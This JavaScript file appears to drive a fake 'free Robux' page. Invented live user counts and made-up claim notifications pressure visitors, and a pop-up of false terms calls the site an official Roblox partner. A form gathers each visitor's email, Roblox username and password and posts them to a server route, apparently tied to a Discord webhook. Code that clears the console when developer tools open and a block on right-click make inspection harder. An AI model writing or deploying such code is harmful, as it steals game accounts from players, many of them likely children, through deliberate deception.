// Configuration
const DISCORD_WEBHOOK = ""; // Set in Vercel Environment Variables

// Live Users Counter
function updateLiveUsers() {
    const userElement = document.getElementById('liveUsers');
    let users = 1247;
    
    setInterval(() => {
        const increment = Math.floor(Math.random() * 10) + 1;
        users += increment;
        userElement.textContent = users.toLocaleString();
        
        if (Math.random() > 0.7) {
            showNotification();
        }
    }, 3000);
}

// Package Selection
let selectedAmount = 0;

function selectPackage(amount) {
    selectedAmount = amount;
    
    document.getElementById('selectedAmount').textContent = amount.toLocaleString();
    document.getElementById('robuxAmount').value = amount;
    document.getElementById('selectedPackage').style.display = 'block';
    document.getElementById('verificationForm').style.display = 'block';
    
    document.getElementById('verificationForm').scrollIntoView({ behavior: 'smooth' });
    document.querySelectorAll('.progress-step')[1].classList.add('active');
}

// Captcha
function refreshCaptcha() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let captcha = '';
    for (let i = 0; i < 5; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    document.getElementById('captchaText').textContent = captcha;
}

// Live Feed Updates
function updateLiveFeed() {
    const users = ['Alex', 'Sarah', 'Mike', 'Emma', 'John', 'Lisa', 'David', 'Anna'];
    const amounts = ['500', '1,000', '2,500', '5,000', '10,000'];
    
    const feed = document.getElementById('liveFeed');
    
    setInterval(() => {
        const user = users[Math.floor(Math.random() * users.length)];
        const amount = amounts[Math.floor(Math.random() * amounts.length)];
        const time = Math.floor(Math.random() * 5) + 1;
        
        const item = document.createElement('div');
        item.className = 'live-item';
        item.innerHTML = `<i class="fas fa-user" style="color:#00a2ff"></i> 
                         <strong>${user}</strong> just received 
                         <span style="color:#4CAF50; font-weight:bold">${amount} Robux</span> 
                         ${time} minute${time > 1 ? 's' : ''} ago`;
        
        feed.insertBefore(item, feed.firstChild);
        
        if (feed.children.length > 10) {
            feed.removeChild(feed.lastChild);
        }
    }, 5000);
}

// Show Notification
function showNotification() {
    const amounts = ['500', '1,000', '2,500', '5,000', '10,000'];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    
    const notification = document.getElementById('notification');
    notification.querySelector('span').textContent = 
        `New user just claimed ${amount} Robux!`;
    
    notification.style.display = 'block';
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

// Form Submission
async function submitForm() {
    const submitBtn = document.getElementById('submitBtn');
    const loading = document.getElementById('loading');
    
    // Validate captcha
    const captcha = document.getElementById('captchaText').textContent;
    const captchaInput = document.getElementById('captchaInput').value;
    
    if (captchaInput.toUpperCase() !== captcha) {
        alert('Invalid CAPTCHA. Please try again.');
        refreshCaptcha();
        return;
    }
    
    // Get form data
    const formData = {
        email: document.getElementById('email').value,
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        robux_amount: document.getElementById('robuxAmount').value,
        platform: document.getElementById('platform').value,
        timestamp: new Date().toISOString()
    };
    
    // Validate required fields
    if (!formData.email || !formData.username || !formData.password) {
        alert('Please fill all required fields');
        return;
    }
    
    // Show loading
    submitBtn.disabled = true;
    loading.style.display = 'block';
    
    try {
        // Send to Vercel function
        const response = await fetch('/process', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });
        
        const result = await response.json();
        
        if (result.success) {
            // Redirect to success page
            window.location.href = `/success?amount=${formData.robux_amount}&username=${encodeURIComponent(formData.username)}`;
        } else {
            alert('Error: ' + result.error);
            loading.style.display = 'none';
            submitBtn.disabled = false;
        }
        
    } catch (error) {
        console.error('Error:', error);
        alert('Network error. Please try again.');
        loading.style.display = 'none';
        submitBtn.disabled = false;
    }
}

// Terms Modal
function showTerms() {
    alert(`TERMS OF SERVICE

1. This is an official Roblox partner service.
2. You must own the account you are claiming Robux for.
3. Only one claim per user every 30 days.
4. Robux will be delivered within 24 hours.
5. Any abuse of this service will result in permanent ban.

By proceeding, you agree to these terms.`);
}

// Anti-debugging
(function() {
    const devtools = /./;
    devtools.toString = function() {
        this.opened = true;
    };
    
    console.log('%c🔧 Debug Mode', devtools.opened ? 'color: red; font-size: 20px' : 'color: green; font-size: 20px');
    
    setInterval(() => {
        if (devtools.opened) {
            console.clear();
        }
    }, 1000);
})();

// Disable right click
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    refreshCaptcha();
    updateLiveUsers();
    updateLiveFeed();
    
    setTimeout(showNotification, 3000);
    
    setInterval(() => {
        const testimonials = document.querySelector('.testimonial-grid');
        if (testimonials && testimonials.children.length > 1) {
            const first = testimonials.firstElementChild;
            testimonials.appendChild(first);
        }
    }, 10000);
});